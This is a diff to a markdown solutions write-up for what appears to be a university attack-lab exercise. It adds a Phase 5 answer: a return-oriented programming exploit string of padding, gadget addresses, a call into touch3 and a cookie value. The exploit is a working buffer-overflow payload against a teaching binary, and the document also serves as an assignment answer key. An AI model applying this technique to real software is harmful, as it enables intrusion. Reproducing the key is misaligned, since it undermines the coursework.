@@ -56,7 +56,7 @@ a8 dc 61 55 c3 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 78 dc 61 55 00 00 00 00
-35 39 62 39 39 37 66 61 /* Our cookie's string representation */
+35 39 62 39 39 37 66 61 /* String representation of our cookie */
 ```
 
 ## Phase 4
@@ -82,3 +82,23 @@ ec 17 40 00 00 00 00 00 /* Address of touch2 */
 ```
 
 ## Phase 5
+Pretty simple but long phase. As the hint suggests, we really only need 8 gadgets to complete this.
+
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00 /* Address of byte sequence for the instruction popq %rax */
+20 00 00 00 00 00 00 00 /* Hex number 0x20 */
+dd 19 40 00 00 00 00 00 /* Address of byte sequence for the instruction movl %eax,%edx */
+34 1a 40 00 00 00 00 00 /* Address of byte sequence for the instruction movl %edx,%ecx */
+13 1a 40 00 00 00 00 00 /* Address of byte sequence for the instruction movl %ecx,%esi */
+06 1a 40 00 00 00 00 00 /* Address of byte sequence for the instruction movq %rsp,%rax */
+c5 19 40 00 00 00 00 00 /* Address of byte sequence for the instruction movq %rax,%rdi */
+d6 19 40 00 00 00 00 00 /* Address of add_xy */
+c5 19 40 00 00 00 00 00 /* Address of byte sequence for the instruction movq %rax,%rdi */
+fa 18 40 00 00 00 00 00 /* Address of touch3 */
+35 39 62 39 39 37 66 61 /* String representation of our cookie */
+```
